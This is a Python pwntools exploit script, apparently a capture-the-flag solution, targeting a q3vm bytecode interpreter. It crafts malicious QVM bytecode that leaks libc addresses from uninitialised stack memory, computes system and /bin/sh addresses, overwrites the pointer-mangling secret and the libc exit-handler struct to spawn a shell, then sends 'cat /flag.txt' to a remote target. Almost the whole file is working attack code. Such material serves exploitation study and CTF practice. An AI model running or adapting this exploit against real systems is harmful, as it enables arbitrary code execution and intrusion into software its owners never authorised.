#!/usr/bin/env python3

from pwn import *
from q3vm import *
import ctypes
import itertools

exe = context.binary = ELF('q3vm', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.terminal = ["terminator", "-u", "-e"]
# context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
dir ./q3vm_src

# OP_IGNORE aka OP_DEBUG
b vm.c:1016

# OP_SUB
# b vm.c:1345

# OP_CALL
# b vm.c:1081

# OP_ENTER
# b vm.c:1161

# OP_CALL out of range
b vm.c:1138

define pstack
    tele &image[programStack] 0x20
end

define ddump
    tele image 0x20
end

alias r0 = p/x r0
alias r1 = p/x r1
define sp
    p/x opStackOfs
    p/x opStack[opStackOfs]
    p/x &opStack[opStackOfs]
    p/x r0
    p/x r1
    dd &opStack[opStackOfs]-0x8 0x20
    tele &opStack[opStackOfs]
end

# b *__run_exit_handlers+310
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

def bp():
    yield OP_IGNORE()

def rel_write4(rel, *args):
    yield from [
        OP_CONST(0xFFFFFFFF),
        *args,
        OP_SUB(),
        OP_ENTER(ctypes.c_uint32(rel).value),
        OP_CALL(),
        OP_ENTER(ctypes.c_uint32(-rel).value),
    ]

def op_store(where, *what):
    yield from [
        OP_CONST(where),
        *what,
        OP_STORE4()
    ]

def get_leak_from_opstack():
    """
    get libc and programStack addrs from uninitialized opStack memory 
    """
    yield from [
        *[OP_PUSH() for _ in range(0x288 // 4)],

        # copy 4B libc lower to data[0]
        OP_POP(),
        OP_POP(),
        OP_CONST(0),
        OP_PUSH(),
        OP_STORE4(),

        # copy 4B libc upper  to data[1]
        OP_PUSH(),
        OP_CONST(0x4),
        OP_PUSH(),
        OP_STORE4(),

        # calculate libc system address
        *op_store(0,
            OP_CONST(0),
            OP_LOAD4(),
            OP_CONST(0x5d33f), # this offset may change
            OP_SUB(),
        ),
    ]

def prepare_values_for_write():
    """
    prepare /bin/sh and system address
    """
    
    yield from [
        # get /bin/sh addr
        *op_store(0x20,
            OP_CONST(0),
            OP_LOAD4(),
            OP_CONST(next(libc.search(b'/bin/sh\x00'))),
            OP_ADD(),
        ),
        *op_store(0x24,
            OP_CONST(0x4),
            OP_LOAD4(),
        ),

        # store libc system addr
        *op_store(0x8,
            OP_CONST(0),
            OP_LOAD4(),
            OP_CONST(libc.sym.system),
            OP_ADD(),
        ),
        *op_store(0xc,
            OP_CONST(0x4),
            OP_LOAD4(),
        ),
        
        # calc base addr
        *op_store(0x50,
            OP_CONST(0x50),
            OP_LOAD4(),
            OP_CONST(0x21740), # this offset may change
            OP_SUB(),
        ),
    ]

def patch_mangle_secret():
    """
    store system addr in secret
    """
    
    # dist canary pstack is -0x176c bytes - seems constant
    offset_to_secret = -0x179c
    
    # PTR_DEMANGLE -> ror val, 0x11, xor fs:[0x30]
    # val = 0, fs:[0x30] = system addr
    
    # set mangle secret as system addr
    yield from [
        *rel_write4(offset_to_secret,
                    OP_CONST(0xc),
                    OP_LOAD4()
                    ),

        *rel_write4(offset_to_secret + 4,
                    OP_CONST(0x8),
                    OP_LOAD4()
                    ),
    ]

def overwrite_initial_struct():
    to_initial_struct_arg = 0x2041cc + 0x20 # point at the end, because we are writing in reverse order
    
    yield from itertools.chain.from_iterable(
            rel_write4(-to_initial_struct_arg + i*4, *v) for i, v in enumerate(reversed([
                [OP_CONST(0)], [OP_CONST(0)],  # next
                [OP_CONST(1)], [OP_CONST(0)],  # idx
                [OP_CONST(4)], [OP_CONST(0)],  # flavor
                [OP_CONST(0)], [OP_CONST(0)],  # at
                [OP_CONST(0x20), OP_LOAD4()], [OP_CONST(0x24), OP_LOAD4()],  # arg
            ]))
        )

def craft():
    code = list(itertools.chain(
        get_leak_from_opstack(),
        prepare_values_for_write(),
        patch_mangle_secret(),
        overwrite_initial_struct(),
    ))
    
    q = QVM()
    q.set_bytecode(code)
    q.bssLength = 0x20000
    info("Crafted exploit")
    return q.get_bytes()


pre_argv = []
post_argv = ["exploit.qvm"]

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            pause()
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

exploit_bytes = craft()
with open("./exploit.qvm", "wb") as f:
    f.write(exploit_bytes)


io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
li = lambda *a, **k: log.info(*a, **k)
ls = lambda *a, **k: log.success(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr


if args.REMOTE:
    sla(b'Payload len', str(len(exploit_bytes)).encode())
    sa(b'Bytes', exploit_bytes)
    
    sl(b"cat /flag.txt")
    data = cl(timeout=1.0).decode()
    print(data)
    if 'Segmentation fault' in data:
        exit(1)
else:
    ia()
